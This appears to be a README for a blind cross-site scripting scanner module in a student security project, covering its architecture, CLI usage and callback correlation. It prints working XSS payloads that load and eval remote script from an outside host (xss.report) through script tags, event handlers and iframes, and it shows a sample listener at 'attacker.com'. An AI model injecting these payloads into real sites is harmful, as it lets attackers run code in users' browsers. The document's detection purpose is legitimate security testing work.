# Blind XSS (BXSS) Detection Module

Production-quality Blind Cross-Site Scripting detection using Out-of-Band callbacks.

## Current Payload Profile (March 2026)

- Payload templates in `bxss/modules/blind_xss/payloads.py` are currently hardcoded to `https://xss.report/c/srikanthreddy334` (plus encoded variants).
- `{LISTENER}` and `{UUID}` placeholders are not used inside the active payload strings.
- This is a fixed payload profile intended for external callback monitoring with the configured `xss.report` endpoint.
  - BXSS results are primarily written to output files; terminal output is intentionally minimal.

## Architecture

```
bxss/
├── core/
│   └── payload_engine.py      # Payload generation/injection helpers
├── modules/
│   └── blind_xss/
│       ├── payloads.py        # Fixed decoded + encoded XSS payload set
│       ├── detector.py        # Injection logic (query, POST, header, JSON)
│       └── xss_module.py      # Module orchestration
├── oob/
│   ├── callback_server.py     # Flask-based HTTP listener
│   ├── correlation.py         # UUID correlation engine
│   └── __init__.py
├── output/
│   ├── callbacks.json         # Raw callback logs
│   ├── findings_xss.json      # Correlated findings
│   └── findings_xss.txt
└── ml_stub.py                 # Future ML integration (planned)
```

## Detection Methodology

**Black-box approach - NO response inspection.**

1. **Payload Injection**: Send fixed XSS payload variants (decoded + URL-encoded)
2. **OOB Callback**: Wait for HTTP callbacks from injected payloads
3. **Correlation**: Match callback evidence to recorded injections where possible
4. **Validation**: Confirm timestamp ordering (callback after injection)

### Detection Criteria

A vulnerability is **confirmed** ONLY if:
- ✅ Callback evidence is received for injected payload activity
- ✅ Callback timestamp > injection timestamp
- ✅ Valid HTTP callback received on listener

## Usage

### Quick Start

```bash
# 1. Start callback server (in terminal 1)
cd bxss/oob
python callback_server.py --host 0.0.0.0 --port 5000

# 2. Run BXSS scan (in terminal 2)
python main.py --scan bxss --file sample_urls.txt --recon --listener http://YOUR_IP:5000 --threads 2 --wait 30
```

### CLI Options

```bash
python main.py --scan bxss \
  --file targets.txt \
  --recon \
  --listener http://attacker.com:5000 \
  --threads 2 \
  --wait 30
```

**Arguments:**
- `--scan bxss`: Enable Blind XSS module
- `--listener`: Listener URL used by BXSS runtime components
- `--file` or `-u`: Target URLs/domain
- `--recon`: Run reconnaissance (gau + gf)
- `--threads`: Concurrent workers (default: 2)
- `--wait`: Seconds to wait for delayed callbacks (default: 30)

Note: with the current fixed payload profile, payload callbacks point to `xss.report` values defined in `payloads.py`.

### Standalone Callback Server

```bash
# Run callback server independently
python bxss/oob/callback_server.py --host 0.0.0.0 --port 5000 --debug
```

## Payload Categories

### 1. Script Injection (fixed callback variants)
```html
'"><script src=https://xss.report/c/srikanthreddy334></script>
<script>fetch("//xss.report/c/srikanthreddy334").then(r=>r.text()).then(t=>eval(t))</script>
```

### 2. Event Handlers (fixed callback variants)
```html
<div onmouseover="var a=document.createElement('script');a.src='https://xss.report/c/srikanthreddy334';document.body.appendChild(a)">Hover me</div>
<audio src="x" onerror="var a=document.createElement('script');a.src='https://xss.report/c/srikanthreddy334';document.body.appendChild(a)">
```

### 3. Filter Bypass (fixed callback variants)
```html
<iframe src="javascript:var a=document.createElement('script');a.src='https://xss.report/c/srikanthreddy334';document.body.appendChild(a)"></iframe>
%3Ciframe%20src=%22javascript:var%20a=document.createElement('script');a.src='https://xss.report/c/srikanthreddy334';document.body.appendChild(a)%22%3E%3C/iframe%3E
```

### 4. JSON/Header/Exfil
- `JSON_PAYLOADS = []`
- `HEADER_PAYLOADS = []`
- `EXFIL_PAYLOADS = []`

**Total: fixed decoded + URL-encoded payload set in `payloads.py`**

## Injection Points

The detector tests:
- ✅ URL query parameters
- ✅ POST form parameters
- ✅ JSON API bodies
- ✅ HTTP headers (User-Agent, Referer, X-Forwarded-For)

## Confidence Scoring

| Level | Criteria |
|-------|----------|
| **LOW** | Single callback received |
| **MEDIUM** | Multiple callbacks from same endpoint |
| **HIGH** | Repeated callbacks over time (>60s apart) |

## Output Format

Most BXSS evidence is saved here:
- `bxss/output/findings_xss.txt`
- `bxss/output/findings_xss.json`
- `bxss/output/callbacks.db`

To watch findings in real time:

```powershell
Get-Content 'bxss/output/findings_xss.txt' -Wait
```

### findings_xss.json
```json
[
  {
    "url": "http://127.0.0.1:8000/comment?text=hello",
    "parameter": "text",
    "payload": "<script ...>",
    "injection_timestamp": "2026-03-08T13:47:57.678186",
    "callback_timestamp": "2026-03-08T13:47:57.719016",
    "callback_source_ip": "127.0.0.1",
    "callback_user_agent": "python-requests/2.32.4",
    "uuid": "bb3cfcd3-8e0b-48dc-8ea9-13dde4440e49",
    "delay_seconds": 0.04
  }
]
```

### findings_xss.txt
```
================================================================================
BLIND XSS FINDINGS
================================================================================

[1] http://target.com/search
  Parameter: text
  Payload: <script ...>
  Injection Time: 2026-03-08T13:47:57.678186
  Callback Time: 2026-03-08T13:47:57.719016
  Delay: 0.04s
  Source IP: 127.0.0.1
  User-Agent: python-requests/2.32.4
  UUID: bb3cfcd3-8e0b-48dc-8ea9-13dde4440e49
```

## Integration with Existing Project

**Reuses BSQLI infrastructure:**
- ✅ `bsqli.core.http_client.HttpClient` (HTTP abstraction)
- ✅ `bsqli.core.logger.get_logger()` (logging)
- ✅ `bsqli.recon.recon_manager.gather_parameterized_urls()` (reconnaissance)
- ✅ Same ThreadPoolExecutor pattern
- ✅ Same CLI structure in main.py

**No modifications to BSQLI code.**

## Network Setup

### Public Listener
If using a public server:
```bash
# On public server (e.g., VPS)
python bxss/oob/callback_server.py --host 0.0.0.0 --port 5000

# From scanning machine
python main.py --scan bxss --listener http://YOUR_PUBLIC_IP:5000 ...
```

### ngrok (Development)
```bash
# Terminal 1: Start callback server
python bxss/oob/callback_server.py --port 5000

# Terminal 2: Expose via ngrok
ngrok http 5000

# Terminal 3: Scan with ngrok URL
python main.py --scan bxss --listener http://YOUR_NGROK_URL ...
```

## Future ML Integration (Stub Only)

Planned features (see `ml_stub.py`):
- Callback timing analysis (Isolation Forest)
- Injection context success rate
- Payload effectiveness learning
- False positive reduction
- Adaptive scanning based on model predictions

**Status: NOT YET IMPLEMENTED**

## Testing

```bash
# Install dependencies
pip install -r requirements.txt

# Test callback server
python bxss/oob/callback_server.py --port 5000

# Manually trigger callback
curl "http://localhost:5000/?id=test-uuid-123"

# Check callbacks
python -c "from bxss.oob.callback_server import get_callbacks; print(get_callbacks())"
```

## Troubleshooting

### No callbacks received
- ✅ Check callback server is running
- ✅ Verify listener URL is publicly accessible
- ✅ Check firewall rules (port 5000 open)
- ✅ Test with `curl http://YOUR_IP:5000/test`

### Correlation fails
- ✅ Ensure callback timestamp > injection timestamp
- ✅ Check callback extraction from path/query
- ✅ Verify callback records in `callbacks.db`

### Payloads not triggering
- ✅ Target may have WAF/CSP protection
- ✅ Try filter bypass payloads
- ✅ Increase wait time (`--wait 60`)
- ✅ Check if target is vulnerable (not all sites are)

## Differences from SQLi Module

| Feature | BSQLI | BXSS |
|---------|-------|------|
| Detection method | Response timing/content | OOB callback |
| Requires listener | ❌ No | ✅ Yes |
| Response inspection | ✅ Yes | ❌ No |
| Payload correlation | N/A | Callback evidence + metadata |
| Immediate results | ✅ Yes | ❌ Delayed |
| Stored vulnerability | ❌ No | ✅ Yes |

## Production Considerations

1. **Callback Server Security**
   - Run on dedicated server
   - Use HTTPS (not HTTP) for production
   - Implement rate limiting
   - Add authentication for callback endpoints

2. **Scan Responsibly**
   - Only scan authorized targets
   - Respect rate limits
   - Clean up injected payloads
   - Monitor callback server logs

3. **Performance**
   - Adjust `--threads` based on target capacity
   - Increase `--wait` for stored XSS scenarios
   - Use `--listener` on low-latency server

## License

Part of the Blind SQL Injection Detection Framework final year project.
